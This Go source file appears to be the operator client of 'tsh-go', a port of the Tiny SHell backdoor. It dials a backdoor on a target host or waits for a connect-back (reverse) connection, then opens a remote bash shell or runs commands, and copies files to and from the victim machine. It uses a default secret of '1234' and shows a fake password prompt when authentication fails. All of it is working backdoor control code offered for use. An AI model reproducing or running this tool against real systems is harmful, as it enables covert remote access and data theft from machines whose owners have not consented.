package tsh

import (
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"

	"github.com/schollz/progressbar/v3"
	"golang.org/x/crypto/ssh/terminal"
)

func Run() {
	var secret string
	var port int

	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
	flagset.StringVar(&secret, "s", "1234", "secret")
	flagset.IntVar(&port, "p", 1234, "port")
	flagset.Usage = func() {
		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action>\n", flagset.Name())
		fmt.Fprintf(flagset.Output(), "  action:\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> [command]\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> get <source-file> <dest-dir>\n")
		fmt.Fprintf(flagset.Output(), "        <hostname|cb> put <source-file> <dest-dir>\n")
		flagset.PrintDefaults()
	}
	flagset.Parse(os.Args[1:])

	args := flagset.Args()
	var host, srcfile, dstdir, command string
	var isConnectBack bool
	var mode uint8

	if len(args) == 0 {
		os.Exit(0)
	}

	if args[0] == "cb" {
		isConnectBack = true
	} else {
		host = args[0]
	}
	args = args[1:]

	command = "exec bash --login"
	switch {
	case len(args) == 0:
		mode = constants.RunShell
	case args[0] == "get" && len(args) == 3:
		mode = constants.GetFile
		srcfile = args[1]
		dstdir = args[2]
	case args[0] == "put" && len(args) == 3:
		mode = constants.PutFile
		srcfile = args[1]
		dstdir = args[2]
	default:
		mode = constants.RunShell
		command = args[0]
	}

	if isConnectBack {
		// connect back mode
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			os.Exit(0)
		}
		fmt.Print("Waiting for the server to connect...")
		layer, err := ln.Accept()
		if err != nil {
			fmt.Print("\nPassword: ")
			fmt.Scanln()
			fmt.Println("Authentication failed.")
			os.Exit(0)
		}
		fmt.Println("connected.")
		defer layer.Close()
		layer.Write([]byte{mode})
		switch mode {
		case constants.RunShell:
			handleRunShell(layer, command)
		case constants.GetFile:
			handleGetFile(layer, srcfile, dstdir)
		case constants.PutFile:
			handlePutFile(layer, srcfile, dstdir)
		}
	} else {
		addr := fmt.Sprintf("%s:%d", host, port)
		layer, err := pel.Dial(addr, secret, false)
		if err != nil {
			fmt.Print("Password:")
			fmt.Scanln()
			fmt.Println("Authentication failed.")
			os.Exit(0)
		}
		defer layer.Close()
		layer.Write([]byte{mode})
		switch mode {
		case constants.RunShell:
			handleRunShell(layer, command)
		case constants.GetFile:
			handleGetFile(layer, srcfile, dstdir)
		case constants.PutFile:
			handlePutFile(layer, srcfile, dstdir)
		}
	}
}

func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
	buffer := make([]byte, constants.Bufsize)

	basename := strings.ReplaceAll(srcfile, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	f, err := os.OpenFile(filepath.Join(dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	_, err = layer.Write([]byte(srcfile))
	if err != nil {
		return
	}
	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
	)
	io.CopyBuffer(io.MultiWriter(f, bar), layer, buffer)
	fmt.Print("\nDone.\n")
}

func handlePutFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
	buffer := make([]byte, constants.Bufsize)
	f, err := os.Open(srcfile)
	if err != nil {
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return
	}
	fsize := fi.Size()

	basename := filepath.Base(srcfile)
	basename = strings.ReplaceAll(basename, "\\", "_")
	_, err = layer.Write([]byte(dstdir + "/" + basename))
	if err != nil {
		fmt.Println(err)
		return
	}
	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
	)
	io.CopyBuffer(io.MultiWriter(layer, bar), f, buffer)
	fmt.Print("\nDone.\n")
}

func handleRunShell(layer *pel.PktEncLayer, command string) {
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	_, err = layer.Write([]byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(0)
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	_, err = layer.Write([]byte(command))
	if err != nil {
		return
	}

	buffer := make([]byte, constants.Bufsize)
	buffer2 := make([]byte, constants.Bufsize)
	go func() {
		_, _ = io.CopyBuffer(os.Stdout, layer, buffer)
		layer.Close()
	}()
	_, _ = io.CopyBuffer(layer, os.Stdin, buffer2)
}
